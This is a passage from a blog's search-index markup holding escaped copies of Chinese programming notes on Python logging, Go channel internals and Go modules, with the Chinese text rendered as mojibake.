               &amp;quot;message&amp;quot;: {
                   &amp;quot;DEBUG&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;INFO&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;WARNING&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;ERROR&amp;quot;: &amp;quot;red&amp;quot;,
                   &amp;quot;CRITICAL&amp;quot;: &amp;quot;bold_red&amp;quot;
               }
           },
           style=&amp;quot;%&amp;quot;
       )  # æ—¥å¿—è¾“å‡ºæ ¼å¼
stream_handler.setFormatter(formatter)
my_logger.addHandler(stream_handler)
my_logger.propagate = False  # å…³é—­å‘çˆ¶loggerä¼ é€’ï¼Œé¿å…é‡å¤è¾“å‡º

&lt;/code&gt;&lt;/pre&gt;
">ã€pythonã€‘loggingåº“</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-channel-yuan-li/"" data-c="
          &lt;h1 id=&#34;channelå®ç°åŸç†&#34;&gt;channelå®ç°åŸç†&lt;/h1&gt;
&lt;p&gt;åç¨‹Aåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åˆ›å»ºäº†å­åç¨‹A1ï¼ŒA2... Anï¼Œç„¶åç­‰å¾…å­åç¨‹æ‰§è¡Œå®Œåé€€å‡ºï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®Œæˆå¯¹å­åç¨‹çš„æ§åˆ¶ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨channelæ§åˆ¶å­åç¨‹&lt;/li&gt;
&lt;li&gt;waitGroupä¿¡å·é‡æœºåˆ¶æ§åˆ¶å­åç¨‹&lt;/li&gt;
&lt;li&gt;Contextä¸Šä¸‹æ–‡æ§åˆ¶å­åç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;channel&#34;&gt;channel&lt;/h2&gt;
&lt;h3 id=&#34;ç®€å•ä»‹ç»&#34;&gt;ç®€å•ä»‹ç»&lt;/h3&gt;
&lt;p&gt;channelä¸»è¦æ˜¯æä¾›ç»™ä¸¤ä¸ªåç¨‹ä¹‹é—´æ¶ˆæ¯ä¼ é€’çš„ï¼Œchannelåˆ†ä¸º&lt;strong&gt;åŒæ­¥&lt;/strong&gt;å’Œ&lt;strong&gt;å¼‚æ­¥&lt;/strong&gt;ä¸¤ç§ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ­¥çš„channelç¼“å†²åŒºå¤§å°ä¸º1ï¼Œå½“ç¼“å†²åŒºå­˜åœ¨æ•°æ®ï¼Œå‘é€å‘é˜»å¡ï¼Œç›´åˆ°æ•°æ®è¢«æ¥æ”¶æ–¹å–å‡ºï¼›å½“ç¼“å†²åŒºä¸ºç©ºï¼Œæ¥æ”¶æ–¹é˜»å¡ï¼Œç›´åˆ°å‘é€æ–¹å‘é€æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;å¼‚æ­¥çš„channelç¼“å†²åŒºå¤§å°å¤§äº1ï¼Œå½“ç¼“å†²åŒºæ»¡ï¼Œå‘é€å‘é˜»å¡ï¼Œç›´åˆ°æœ‰æ¥æ”¶æ–¹å–å‡ºæ•°æ®ï¼›å½“ç¼“å†²åŒºä¸ºç©ºï¼Œæ¥æ”¶æ–¹é˜»å¡ï¼Œç›´åˆ°å‘é€æ–¹å‘é€æ•°æ®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;channelå®ç°åŸç†-2&#34;&gt;channelå®ç°åŸç†&lt;/h3&gt;
&lt;p&gt;channelæ•°æ®ç»“æ„(runtime/chan.go)ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type hchan struct {
 qcount   uint           // total data in the queueï¼ˆå¾ªç¯é˜Ÿåˆ—å…ƒç´ æ•°é‡ï¼‰
 dataqsiz uint           // size of the circular queueï¼ˆå¾ªç¯é˜Ÿåˆ—å¤§å°ï¼‰
 buf      unsafe.Pointer // points to an array of dataqsiz elementsï¼ˆå¾ªç¯é˜Ÿåˆ—æŒ‡é’ˆï¼‰
 elemsize uint16 //chanä¸­å…ƒç´ å¤§å°
 closed   uint32 //æ˜¯å¦å·²ç»close
 elemtype *_type // element typeï¼ˆchanå…ƒç´ ç±»å‹ï¼‰
 sendx    uint   // send indexï¼ˆsendåœ¨bufä¸­ç´¢å¼•ï¼‰
 recvx    uint   // receive indexï¼ˆrecvåœ¨bufä¸­ç´¢å¼•ï¼‰
 recvq    waitq  // list of recv waitersï¼ˆreceiveçš„ç­‰å¾…é˜Ÿåˆ—ï¼‰
 sendq    waitq  // list of send waitersï¼ˆsenderç­‰å¾…é˜Ÿåˆ—ï¼‰

 // lock protects all fields in hchan, as well as several
 // fields in sudogs blocked on this channel.
 //
 // Do not change another G&#39;s status while holding this lock
 // (in particular, do not ready a G), as this can deadlock
 // with stack shrinking.
 lock mutex //äº’æ–¥é”ï¼Œä¿æŠ¤æ‰€æœ‰å­—æ®µï¼Œä¸Šé¢æ³¨é‡Šå·²ç»è®²å¾—éå¸¸æ˜ç¡®äº†
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;chanåˆå§‹åŒ–&#34;&gt;chanåˆå§‹åŒ–&lt;/h4&gt;
&lt;p&gt;chanåœ¨åˆå§‹åŒ–æ—¶ï¼Œä¼šæ ¹æ®å®¹é‡å¤§å°é€‰æ‹©è°ƒç”¨&lt;code&gt;makechan64&lt;/code&gt;æˆ–è€…&lt;code&gt;makechan&lt;/code&gt;ï¼Œå…¶ä¸­&lt;code&gt;makechan64&lt;/code&gt;åªæ˜¯åšäº†sizeæ£€æŸ¥ï¼Œç„¶ååº•å±‚è¿˜æ˜¯è°ƒç”¨&lt;code&gt;makechan&lt;/code&gt;å®ç°çš„ï¼Œ&lt;code&gt;makechan&lt;/code&gt;æ¥ç”Ÿæˆ&lt;code&gt;hchan&lt;/code&gt;å¯¹è±¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func makechan(t *chantype, size int) *hchan {
    elem := t.elem
    //ç¼–è¯‘å™¨ä¼šæ£€æŸ¥ç±»å‹æ˜¯å¦å®‰å…¨
    // compiler checks this but be safe.
    if elem.size &amp;gt;= 1&amp;lt;&amp;lt;16 {//æ˜¯å¦ &amp;gt;= 2^16
        throw(&amp;quot;makechan: invalid channel element type&amp;quot;)
    }
    if hchanSize%maxAlign != 0 || elem.align &amp;gt; maxAlign {
        throw(&amp;quot;makechan: bad alignment&amp;quot;)
    }
    mem, overflow := math.MulUintptr(elem.size, uintptr(size))
    if overflow || mem &amp;gt; maxAlloc-hchanSize || size &amp;lt; 0 {
        panic(plainError(&amp;quot;makechan: size out of range&amp;quot;))
    }
    var c *hchan
    switch {
        case mem == 0:
        // chançš„sizeæˆ–å…ƒç´ çš„sizeä¸º0ï¼Œå°±ä¸å¿…åˆ›å»ºbuf
        c = (*hchan)(mallocgc(hchanSize, nil, true))
        // ç«äº‰æ£€æµ‹å™¨ä½¿ç”¨æ­¤ä½ç½®è¿›è¡ŒåŒæ­¥
        c.buf = c.raceaddr()
        case elem.ptrdata == 0:
        // å…ƒç´ ä¸æ˜¯æŒ‡é’ˆï¼Œåˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ç»™hchanæ•°æ®ç»“æ„å’Œbuf
        c = (*hchan)(mallocgc(hchanSize+mem, nil, true))
        // hchanæ•°æ®ç»“æ„åé¢ç´§æ¥ç€å°±æ˜¯buf
        c.buf = add(unsafe.Pointer(c), hchanSize)
        default:
        // Elements contain pointers.
        c = new(hchan)
        c.buf = mallocgc(mem, elem, true)
    }
    // å°†å…ƒç´ å¤§å°ã€ç±»å‹ã€å®¹é‡éƒ½è®°å½•ä¸‹æ¥
    c.elemsize = uint16(elem.size)
    c.elemtype = elem
    c.dataqsiz = uint(size)
    lockInit(&amp;amp;c.lock, lockRankHchan)
    if debugChan {
        print(&amp;quot;makechan: chan=&amp;quot;, c, &amp;quot;; elemsize=&amp;quot;, elem.size, &amp;quot;; dataqsiz=&amp;quot;, size, &amp;quot;\n&amp;quot;)
    }
    return c
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶å®å°±æ˜¯æ ¹æ®ä¸åŒå®¹é‡å’Œå…ƒç´ ç±»å‹ï¼Œæ¥åˆ†é…ä¸åŒå¯¹è±¡æ¥åˆå§‹åŒ–chanå¯¹è±¡çš„å­—æ®µï¼Œæœ€åè¿”å›hchanå¯¹è±¡ã€‚&lt;/p&gt;
&lt;h4 id=&#34;sendæ–¹æ³•&#34;&gt;sendæ–¹æ³•&lt;/h4&gt;
&lt;p&gt;sendæ–¹æ³•åº•å±‚è°ƒç”¨æ—¶ä¼šå‘ç”Ÿï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é”å®šæ•´ä¸ªchannelï¼›&lt;/li&gt;
&lt;li&gt;é¦–å…ˆåˆ¤æ–­chanæ˜¯å¦ä¸ºnil(æœªåˆå§‹åŒ–)ï¼Œå¦‚æœæ˜¯nilï¼Œå‘é€è€…ä¼šæ°¸è¿œé˜»å¡ï¼›&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;å¦‚æœchanä¸ä¸ºnilï¼Œå¹¶ä¸”chanæ»¡äº†ï¼Œåˆ™ç›´æ¥è¿”å›ï¼›&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;å¦‚æœchanè¢«closeäº†ï¼Œä¼šå¼•å‘panicï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœæœ‰recvqæœ‰ç­‰å¾…ï¼Œè¯´æ˜bufä¸ºç©ºï¼Œé‚£ä¹ˆç›´æ¥ä»recvqä¸­å–å‡ºä¸€ä¸ªç­‰å¾…çš„goroutineï¼Œå¹¶å°†æ•°æ®ç›´æ¥å†™å…¥ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœæ²¡æœ‰recvqï¼Œè€ƒè™‘bufç©ºé—´æ˜¯ä¸æ˜¯å·²æ»¡ï¼Œå¦‚æœé˜Ÿåˆ—æœªæ»¡ï¼Œåˆ™å°†æ•°æ®æ‹·è´åˆ°bufä¸­(é€šè¿‡å“¦memmove()å‡½æ•°å†…å­˜æ‹·è´)ï¼›å¦‚æœé˜Ÿåˆ—æ»¡äº†ï¼Œé‚£ä¹ˆå‘é€è€…çš„goroutineå°±ä¼šåŠ å…¥åˆ°å‘é€è€…çš„ç­‰å¾…é˜Ÿåˆ—ä¸­å¹¶é˜»å¡ï¼Œç›´åˆ°è¢«å”¤é†’(æ•°æ®è¢«å–èµ°ï¼Œæˆ–è€…chanè¢«close)ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;recvæ–¹æ³•&#34;&gt;recvæ–¹æ³•&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœchanä¸ºnilï¼Œæ¥æ”¶è€…ä¼šè¢«æ°¸è¿œé˜»å¡ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœchanä¸ä¸ºnilï¼Œä½†chanä¸ºç©ºï¼Œæ¥æ”¶è€…å°±ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°æœ‰senderå‘é€æ•°æ®æˆ–chanè¢«closeï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœchanè¢«closeäº†ï¼Œå¹¶ä¸”é˜Ÿåˆ—ä¸­æ²¡æœ‰ç¼“å­˜çš„å…ƒç´ ï¼Œé‚£ä¹ˆè¿”å›ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœå­˜åœ¨senderç­‰å¾…ï¼šå¦‚æœæ˜¯åŒæ­¥çš„channelï¼Œé‚£ä¹ˆç›´æ¥å°†senderçš„æ•°æ®å¤åˆ¶ç»™reveiverï¼Œå¦åˆ™å°±ä»bufä¸­ï¼›å–å‡ºä¸€ä¸ªå…ƒç´ ç»™reveiverï¼ŒæŠŠsenderçš„æ•°æ®æ·»åŠ åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœæ²¡æœ‰senderç­‰å¾…ï¼šå¦‚æœé˜Ÿåˆ—ä¸­æœ‰å…ƒç´ ï¼Œå°±å–å‡ºä¸€ä¸ªå…ƒç´ ç»™receiverï¼›å¦‚æœé˜Ÿåˆ—ä¸­æ²¡æœ‰å…ƒç´ ï¼Œé‚£ä¹ˆå½“å‰receiverå°±ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°å®ƒä»senderä¸­æ¥æ”¶äº†æ•°æ®ï¼Œæˆ–è€…chanè¢«closeæ‰è¿”å›ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æˆ‘è®¤ä¸ºä¸Šé¢åŸç†æ€§çš„ä¸œè¥¿äº†è§£ä»¥ä¸‹å°±å¯ä»¥ï¼ŒæŒæ¡å®ƒçš„ç‰¹æ€§å³å¯ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­é¿å…å‡ºç°æ­»é”æˆ–è€…æ— é™åˆ¶çš„åç¨‹åˆ›å»ºç­‰é—®é¢˜ã€‚&lt;/p&gt;
&lt;h3 id=&#34;channelçŠ¶æ€&#34;&gt;channelçŠ¶æ€&lt;/h3&gt;
&lt;p&gt;channelæœ‰ä¸‰ç§çŠ¶æ€ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nilï¼Œå³æ²¡æœ‰åˆå§‹åŒ–çš„çŠ¶æ€ï¼›&lt;/li&gt;
&lt;li&gt;æ­£å¸¸çŠ¶æ€ï¼Œå¯ä»¥è¿›è¡Œæ­£å¸¸è¯»å†™ï¼›&lt;/li&gt;
&lt;li&gt;closedå·²å…³é—­&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å‘ä¸åŒçš„çŠ¶æ€çš„channelæ”¶å‘æ•°æ®ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å‘nilçŠ¶æ€çš„channelæ”¶å‘ï¼Œä¼šè¿›å…¥é˜»å¡çŠ¶æ€ï¼›&lt;/li&gt;
&lt;li&gt;å‘å·²å…³é—­çš„channelå‘é€æ•°æ®ï¼Œä¼šå¼•å‘panicï¼›&lt;/li&gt;
&lt;li&gt;å‘å·²å…³é—­çš„channelæ¥æ”¶æ•°æ®ï¼Œä¼šè¿”å›ç¼“å†²å€¼æˆ–é›¶å€¼ã€‚&lt;/li&gt;
&lt;li&gt;close nil/closedçŠ¶æ€çš„channelä¼šå¼•å‘panic&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å½“channelä½¿ç”¨å®Œæ¯•ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°&lt;code&gt;close()&lt;/code&gt;å‡½æ•°æ¥å…³é—­channelã€‚channelæ˜¯å¼•ç”¨ç±»å‹ï¼Œchannelæ˜¯å¯ä»¥è¿›è¡Œåƒåœ¾å›æ”¶çš„ï¼Œæ‰€ä»¥å…³é—­channelå¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œåªè¦æ²¡æœ‰åç¨‹å¼•ç”¨channelï¼Œæœ€ç»ˆå°±ä¼šè¢«GCå¤„ç†ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ä¸è¦è®©åç¨‹é˜»å¡åˆ°channelä¸Šï¼Œè¿™ç§æƒ…å†µå¾ˆéš¾æ£€æµ‹åˆ°ï¼Œè€Œä¸”ä¼šé€ æˆchannelå’Œé˜»å¡åœ¨channelçš„åç¨‹å æœ‰çš„èµ„æºæ— æ³•è¢«GCæ¸…ç†æœ€ç»ˆå¯¼è‡´å†…å­˜æ³„æ¼ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨åœºæ™¯&#34;&gt;ä½¿ç”¨åœºæ™¯&lt;/h3&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/408598288&lt;/p&gt;
">ã€goã€‘channelåŸç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-go-module-ban-ben-guan-li/"" data-c="
          &lt;h1 id=&#34;åŒ…å’Œæ¨¡å—&#34;&gt;åŒ…å’Œæ¨¡å—&lt;/h1&gt;
&lt;h2 id=&#34;gopath&#34;&gt;GOPATH&lt;/h2&gt;
&lt;p&gt;è¿›è¡Œgolangå¼€å‘æ—¶çš„å·¥ä½œç©ºé—´ï¼Œä½ ç¼–å†™çš„goæºä»£ç å’Œç¼–è¯‘åç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºä»¥åŠä¸‹è½½çš„ç¬¬ä¸‰æ–¹åŒ…éƒ½å°†å­˜æ”¾åœ¨GOPATHä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼ŒGOPATHåªæ˜¯ä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶ç›®å½•å¹¶ä¸”ä½ æ‰€æœ‰çš„ç¼–ç å·¥ä½œéƒ½åº”è¯¥åœ¨è¯¥ç›®å½•ä¸‹å®Œæˆ(golang 1.11ç‰ˆæœ¬å¼•å…¥ åŒ…ä¾èµ–ç®¡ç†å·¥å…·go modï¼Œå¯ä»¥åœ¨GOPATHä»¥å¤–ç¼–å†™goç¨‹åº)ã€‚éœ€è¦åˆ›å»ºç¯å¢ƒå˜é‡æŒ‡å®šGOPATHä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;GOPATHçš„ç›®å½•ç»“æ„ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;binï¼šå­˜æ”¾ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶&lt;/li&gt;
&lt;li&gt;srcï¼šå­˜æ”¾GOç¨‹åºæºç ï¼Œæ¯ä¸ªç›®å½•å¯¹åº”ä¸€ä¸ªåŒ…&lt;/li&gt;
&lt;li&gt;pkgï¼šåŒ…å¯¹è±¡&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;GOPATHå¯ä»¥åŒ…å«å¤šä¸ªç›®å½•ï¼Œä½†è¿™äº›ç›®å½•ä¸èƒ½å’Œgoçš„å®‰è£…ç›®å½•ç›¸åŒã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç¬¬ä¸‰æ–¹åŒ…çš„å¯¼å…¥&#34;&gt;ç¬¬ä¸‰æ–¹åŒ…çš„å¯¼å…¥&lt;/h3&gt;
&lt;p&gt;å¦‚æœé¡¹ç›®ä¸­éœ€è¦å¼•å…¥ç¬¬ä¸‰æ–¹åŒ…ï¼Œåˆ™ä½¿ç”¨importå¯¼å…¥åŒ…ï¼Œä¾‹å¦‚&lt;code&gt;import &amp;quot;github.com/go-redis/redis&amp;quot;&lt;/code&gt;ï¼Œç„¶åä½¿ç”¨&lt;code&gt;go get github.com/go-redis/redis&lt;/code&gt;å‘½ä»¤å°†è¯¥åŒ…ä¸‹è½½ä¸‹æ¥åˆ°GOPATH/pkg/github.com/go-redis/redisç›®å½•ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½çš„è¿‡ç¨‹ï¼šgoä¼šå°†åŒ…æ‹¼æ¥æˆhttpsåè®®çš„URLåœ°å€ï¼Œä¾‹å¦‚https://github.com/go-redis/redisï¼Œgoçš„ç¬¬ä¸‰æ–¹åŒ…æ˜¯å­˜å‚¨åœ¨åƒgitæˆ–SVNè¿™æ ·çš„åœ¨çº¿ç‰ˆæœ¬æ§åˆ¶ç®¡ç†ç³»ç»Ÿä¸Šçš„ï¼Œgoç›®å‰æ”¯æŒçš„åœ¨çº¿ç‰ˆæœ¬ç®¡ç†ç±»å‹ï¼šBazaar(.bar)/Fossil(.fossil)/Git(.git)/Mercurial(.hg)/Subversion(.svn)&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥åœ¨ç¤ºä¾‹ä¸­ï¼Œgoé¦–å…ˆä¼šè§£ægithub.com/go-redis/redis.gitã€‚å…¶æ¬¡æ ¹æ®æ”¯æŒçš„åè®®ä¾æ¬¡å°è¯•cloneè¯¥åŒ…ï¼Œè‹¥è¯¥åœ¨çº¿ç‰ˆæœ¬ç®¡ç†ç³»ç»Ÿæ”¯æŒå¤šç§åè®®ï¼Œé‚£ä¹ˆgoä¼šä¸€æ¬¡å°è¯•ã€‚ç„¶åå°†åŒ…cloneåˆ°GOPATH/pkgä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¼ºç‚¹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¤šä¸ªé¡¹ç›®éƒ½ä¿å­˜åœ¨GOPATH/srcä¸‹ï¼Œæ‰€æœ‰é¡¹ç›®å¯¼å…¥çš„ç¬¬ä¸‰æ–¹åŒ…éƒ½åœ¨GOPATH/pkgä¸‹ï¼Œé€ æˆé¡¹ç›®æ¯”è¾ƒæ··ä¹±ã€‚&lt;/li&gt;
&lt;li&gt;å¯¼å…¥çš„ç¬¬ä¸‰æ–¹åŒ…éƒ½ä¼šä»¥æœ€masteråˆ†æ”¯çš„æ–°ç‰ˆæœ¬è¿›è¡Œä¸‹è½½ï¼Œä¸”ä¸èƒ½æŒ‡å®šç‰ˆæœ¬ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;modules&#34;&gt;Modules&lt;/h2&gt;
&lt;p&gt;æ˜¯ Go 1.11 ç‰ˆæœ¬ä¹‹åå¼•å…¥çš„ï¼ŒGo 1.11 ä¹‹å‰ä½¿ç”¨ $GOPATH æœºåˆ¶ï¼Œç°åœ¨å®˜æ–¹æ›´æå€¡ä½¿ç”¨go modulesã€‚go modules å¯ä»¥ç®—ä½œæ˜¯è¾ƒä¸ºå®Œå–„çš„åŒ…ç®¡ç†å·¥å…·ã€‚åŒæ—¶æ”¯æŒä»£ç†ï¼Œå›½å†…ä¹Ÿèƒ½äº«å—é«˜é€Ÿçš„ç¬¬ä¸‰æ–¹åŒ…é•œåƒæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;go modules åœ¨ 1.13 ç‰ˆæœ¬ä»æ˜¯å¯é€‰ä½¿ç”¨çš„ï¼Œé€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡&lt;code&gt;GO111MODULE &lt;/code&gt;æ¥é€‰æ‹©æ˜¯å¦å¼€å¯go modã€‚&lt;code&gt;GO111MODULE &lt;/code&gt;å…±æœ‰ä¸‰ä¸ªå€¼ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;autoï¼šé»˜è®¤å€¼ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸åœ¨&lt;code&gt;$GOPATH&lt;/code&gt;å¹¶ä¸”å½“å‰ç›®å½•æˆ–è€…çˆ¶ç›®å½•ä¸‹æœ‰go.modæ–‡ä»¶ï¼Œåˆ™ä½¿ç”¨go modulesï¼Œå¦åˆ™ä»ä½¿ç”¨GOPATH modeã€‚&lt;/li&gt;
&lt;li&gt;onï¼šä½¿ç”¨go moduleï¼Œå¿½ç•¥GOPATHç›®å½•ã€‚&lt;/li&gt;
&lt;li&gt;offï¼šGOPATH modeï¼ŒåªæŸ¥æ‰¾GOPATHã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Moduleså¯ä»¥æ»¡è¶³ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¼€å‘è€…å¯ä»¥åœ¨ä»»æ„ç›®å½•ä¸‹å·¥ä½œï¼Œä¸ä»…ä»…æ˜¯GOPATHæŒ‡å®šçš„ç›®å½•ä¸‹&lt;/li&gt;
&lt;li&gt;å¯ä»¥å®‰è£…ä¾èµ–åŒ…çš„æŒ‡å®šç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯åªèƒ½ä»masteråˆ†æ”¯å®‰è£…æœ€æ–°çš„ç‰ˆæœ¬ã€‚&lt;/li&gt;
&lt;li&gt;å¯ä»¥å¯¼å…¥åŒä¸€ä¸ªä¾èµ–åŒ…çš„å¤šä¸ªç‰ˆæœ¬&lt;/li&gt;
&lt;li&gt;æœ‰ä¸€ä¸ªç½—åˆ—å½“å‰é¡¹ç›®æ‰€ä¾èµ–åŒ…çš„åˆ—è¡¨ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸€ä¸ªmoduleä¹Ÿæ˜¯å¯ä»¥åƒpackageä¸€æ ·å…±äº«çš„ã€‚å› æ­¤ï¼Œmoduleä¹Ÿå¿…é¡»æ˜¯ä¸€ä¸ªgitä»“åº“æˆ–å…¶å®ƒgoå¯æ”¯æŒçš„ä»£ç æ§åˆ¶ç³»ç»Ÿï¼Œå› æ­¤ï¼Œå®˜æ–¹ç»™çš„å»ºè®®æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸€ä¸ªmoduleå¿…é¡»æ˜¯ä¸€ä¸ªä»£ç æ§åˆ¶ç³»ç»Ÿçš„ä»“åº“ï¼Œå¹¶ä¸”ä¸€ä¸ªä»“åº“åº”è¯¥åªèƒ½åŒ…å«ä¸€ä¸ªmoduleï¼›&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªmoduleåº”è¯¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªpackage&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;åœ¨ä½¿ç”¨go modulesæ—¶ï¼ŒGOPATHæ˜¯æ— æ„ä¹‰çš„ï¼Œä¸è¿‡è¿˜æ˜¯ä¼šæŠŠä¸‹è½½çš„ä¾èµ–å­˜å‚¨åœ¨&lt;code&gt;GOPATH/src/mod&lt;/code&gt;ä¸­ï¼Œä¹Ÿä¼šæŠŠ&lt;code&gt;go install&lt;/code&gt;çš„ç»“æœæ”¾åœ¨&lt;code&gt;GOPATH/bin&lt;/code&gt;ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;package&#34;&gt;Package&lt;/h3&gt;
&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡ä»¶å¤¹å¯ä»¥ä½œä¸º packageï¼Œä¸€ä¸ªmoduleåŒ…å«å¤šä¸ªpackageçš„ç›®å½•ï¼ŒåŒä¸€ä¸ª package å†…éƒ¨å˜é‡ã€ç±»å‹ã€æ–¹æ³•ç­‰å®šä¹‰å¯ä»¥ç›¸äº’çœ‹åˆ°ã€‚goç¨‹åºçš„ç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯&lt;code&gt;package pkgname&lt;/code&gt;ã€‚å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶çš„åŒ…å¿…é¡»æ˜¯&lt;code&gt;main&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶ &lt;code&gt;calc.go&lt;/code&gt;ï¼Œ &lt;code&gt;main.go&lt;/code&gt; å¹³çº§ï¼Œåˆ†åˆ«å®šä¹‰ add å’Œ main æ–¹æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
// main.go
package main

import &amp;quot;fmt&amp;quot;

func main() {
	fmt.Println(add(3, 5)) // 8
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œ &lt;code&gt;go run main.go&lt;/code&gt;ï¼Œä¼šæŠ¥é”™ï¼Œadd æœªå®šä¹‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./main.go:6:14: undefined: add
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å› ä¸º &lt;code&gt;go run main.go&lt;/code&gt; ä»…ç¼–è¯‘ main.go ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å‘½ä»¤éœ€è¦æ¢æˆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run main.go calc.go
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run .
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Go è¯­è¨€ä¹Ÿæœ‰ Public å’Œ Private çš„æ¦‚å¿µï¼Œç²’åº¦æ˜¯åŒ…ã€‚å¦‚æœç±»å‹/æ¥å£/æ–¹æ³•/å‡½æ•°/å­—æ®µçš„é¦–å­—æ¯å¤§å†™ï¼Œåˆ™æ˜¯ Public çš„ï¼Œå¯¹å…¶ä»– package å¯è§ï¼Œå¦‚æœé¦–å­—æ¯å°å†™ï¼Œåˆ™æ˜¯ Private çš„ï¼Œå¯¹å…¶ä»– package ä¸å¯è§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;go-modulesçš„åˆ›å»º&#34;&gt;go modulesçš„åˆ›å»º&lt;/h3&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ä¸‹ï¼Œåˆå§‹åŒ–ä¸€ä¸ª Module&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go mod init github.com/xxx/encodex
go: creating new go.mod: module github.com/xxx/encodex
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶ï¼Œåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº†&lt;code&gt;go.mod&lt;/code&gt;ï¼Œè¿™ä¸ªæ–‡ä»¶è®°å½•å½“å‰æ¨¡å—çš„æ¨¡å—åã€goçš„ç‰ˆæœ¬ä»¥åŠæ‰€æœ‰ä¾èµ–åŒ…çš„ç‰ˆæœ¬ã€‚&lt;/p&gt;
